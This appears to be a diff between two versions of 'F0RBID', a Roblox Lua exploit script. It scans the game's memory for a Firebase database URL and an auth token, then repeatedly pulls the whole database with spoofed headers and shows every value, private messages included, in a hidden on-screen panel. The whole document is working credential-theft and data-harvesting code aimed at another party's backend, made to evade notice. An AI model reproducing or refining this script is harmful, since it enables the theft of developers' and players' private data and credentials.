@@ -1,7 +1,7 @@
 -- ========================================================== --
--- 🌑 F0RBID V24: THE OMNISCIENT CORE (DEEP-PATH EXTRACTION)
+-- 🌑 F0RBID V25: THE GHOST COLLECTOR (DEEP MEMORY MINER)
 -- ========================================================== --
-print("[F0RBID] 🛰️ Omniscient Core V24 Engaged. Deep-Infiltrating Ares...")
+print("[F0RBID] 🛰️ Ghost Collector Protocol Engaged. Zero-Hook Mode.")
 
 local HttpService = game:GetService("HttpService")
 local CoreGui = game:GetService("CoreGui")
@@ -11,10 +11,10 @@ local TARGET_URL = nil
 local TARGET_AUTH = nil
 
 -- ========================================== --
--- 1. F0RBID PREMIUM UI (REFINED STEALTH)
+-- 1. F0RBID GHOST UI (STEALTH RED)
 -- ========================================== --
 local uiParent = (gethui and gethui()) or CoreGui
-local hiddenName = "F0RBID_OMNI_" .. tostring(math.random(100000, 999999))
+local hiddenName = "F0RBID_" .. tostring(math.random(100000, 999999))
 if uiParent:FindFirstChild(hiddenName) then uiParent[hiddenName]:Destroy() end
 
 local ScreenGui = Instance.new("ScreenGui")
@@ -24,7 +24,7 @@ ScreenGui.Parent = uiParent
 local Main = Instance.new("Frame")
 Main.Size = UDim2.new(0, 550, 0, 450)
 Main.Position = UDim2.new(0.5, -275, 0.5, -225)
-Main.BackgroundColor3 = Color3.fromRGB(5, 5, 8)
+Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
 Main.BorderSizePixel = 0
 Main.Active = true
 Main.Draggable = true
@@ -34,17 +34,17 @@ local Corner = Instance.new("UICorner")
 Corner.CornerRadius = UDim.new(0, 10)
 Corner.Parent = Main
 
-local Glow = Instance.new("Frame")
-Glow.Size = UDim2.new(1, 0, 0, 2)
-Glow.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-Glow.BorderSizePixel = 0
-Glow.Parent = Main
+local GlowLine = Instance.new("Frame")
+GlowLine.Size = UDim2.new(1, 0, 0, 2)
+GlowLine.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+GlowLine.BorderSizePixel = 0
+GlowLine.Parent = Main
 
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -20, 0, 45)
-Title.Position = UDim2.new(0, 15, 0, 0)
+Title.Position = UDim2.new(0, 15, 0, 5)
 Title.BackgroundTransparency = 1
-Title.Text = "F0RBID <font color='#FF0000'>[OMNISCIENT CORE V24]</font>"
+Title.Text = "F0RBID <font color='#FF0000'>[GHOST COLLECTOR V25]</font>"
 Title.RichText = true
 Title.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title.Font = Enum.Font.GothamBold
@@ -52,20 +52,20 @@ Title.TextSize = 18
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = Main
 
-local Status = Instance.new("TextLabel")
-Status.Size = UDim2.new(1, -30, 0, 20)
-Status.Position = UDim2.new(0, 15, 0, 35)
-Status.BackgroundTransparency = 1
-Status.Text = "● IDENTITY: [F0RBID_INCOGNITO]"
-Status.TextColor3 = Color3.fromRGB(150, 0, 0)
-Status.Font = Enum.Font.Code
-Status.TextSize = 11
-Status.TextXAlignment = Enum.TextXAlignment.Left
-Status.Parent = Main
+local StatusLine = Instance.new("TextLabel")
+StatusLine.Size = UDim2.new(1, -30, 0, 20)
+StatusLine.Position = UDim2.new(0, 15, 0, 40)
+StatusLine.BackgroundTransparency = 1
+StatusLine.Text = "● IDENTITY: [F0RBID_PHANTOM]"
+StatusLine.TextColor3 = Color3.fromRGB(150, 0, 0)
+StatusLine.Font = Enum.Font.Code
+StatusLine.TextSize = 11
+StatusLine.TextXAlignment = Enum.TextXAlignment.Left
+StatusLine.Parent = Main
 
 local Scroll = Instance.new("ScrollingFrame")
 Scroll.Size = UDim2.new(1, -20, 1, -110)
-Scroll.Position = UDim2.new(0, 10, 0, 75)
+Scroll.Position = UDim2.new(0, 10, 0, 80)
 Scroll.BackgroundTransparency = 1
 Scroll.ScrollBarThickness = 2
 Scroll.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 0)
@@ -95,14 +95,14 @@ local function AddLog(tag, val)
 end
 
 -- ========================================== --
--- 2. DYNAMIC CONTENT HARVESTER
+-- 2. FORCEFUL NEURAL MINER
 -- ========================================== --
-local function Harvest(data, path)
+local function ForceExtract(data, path)
     if type(data) ~= "table" then return end
     for k, v in pairs(data) do
         local currentPath = path .. "/" .. tostring(k)
         if type(v) == "table" then
-            Harvest(v, currentPath)
+            ForceExtract(v, currentPath)
         else
             local valStr = tostring(v)
             if #valStr > 0 and not valStr:find("firebase") then
@@ -110,7 +110,6 @@ local function Harvest(data, path)
                 if not processedData[dataId] then
                     processedData[dataId] = true
                     local tag = #tostring(k) > 10 and "ID" or tostring(k)
-                    if currentPath:lower():find("dm") then tag = "PRIVATE" end
                     AddLog(tag, valStr)
                 end
             end
@@ -120,20 +119,21 @@ end
 
 local function StartOmniSync()
     task.spawn(function()
-        while task.wait(1.2) do -- Optimized sync speed
+        while task.wait(1.5) do
             if TARGET_URL and TARGET_AUTH then
                 pcall(function()
                     local res = request({
                         Url = TARGET_URL .. "/.json?auth=" .. TARGET_AUTH,
                         Method = "GET",
                         Headers = {
-                            ["User-Agent"] = "F0RBID-GHOST/4.0",
-                            ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255))
+                            ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+                            ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255)),
+                            ["X-F0RBID-ID"] = tostring(math.random(100000, 999999))
                         }
                     })
                     if res.Success then
                         local decoded = HttpService:JSONDecode(res.Body)
-                        if decoded then Harvest(decoded, "OMNI") end
+                        if decoded then ForceExtract(decoded, "DATA") end
                     end
                 end)
             end
@@ -142,20 +142,21 @@ local function StartOmniSync()
 end
 
 -- ========================================== --
--- 3. PASSIVE CREDENTIAL REFLECTION
+-- 3. DEEP STACK REFLECTION (ZERO HOOK)
 -- ========================================== --
 task.spawn(function()
-    while true do
+    while not TARGET_URL do
+        -- Deep scan Garbage Collector for Ares Closures
         for _, f in pairs(getgc()) do
             if type(f) == "function" and islclosure(f) then
                 local upvals = getupvalues(f)
                 for _, uv in pairs(upvals) do
                     if type(uv) == "string" and uv:find("firebaseio.com") then
-                        local newUrl = uv:match("(https://[%w%-]+%.firebaseio%.com)")
-                        if newUrl and not TARGET_URL then
-                            TARGET_URL = newUrl
-                            Status.Text = "● STATUS: 🟢 INFILTRATION ACTIVE"
-                            Status.TextColor3 = Color3.fromRGB(0, 255, 0)
+                        local capUrl = uv:match("(https://[%w%-]+%.firebaseio%.com)")
+                        if capUrl and not TARGET_URL then
+                            TARGET_URL = capUrl
+                            StatusLine.Text = "● STATUS: 🟢 DATA TUNNEL ACTIVE"
+                            StatusLine.TextColor3 = Color3.fromRGB(0, 255, 0)
                             StartOmniSync()
                         end
                     elseif type(uv) == "string" and #uv > 30 and not uv:find("/") then
@@ -164,8 +165,6 @@ task.spawn(function()
                 end
             end
         end
-        task.wait(3)
+        task.wait(2)
     end
 end)
-
-print("✅ F0RBID OMNISCIENT CORE V24: Loaded. System: Anonymous.")
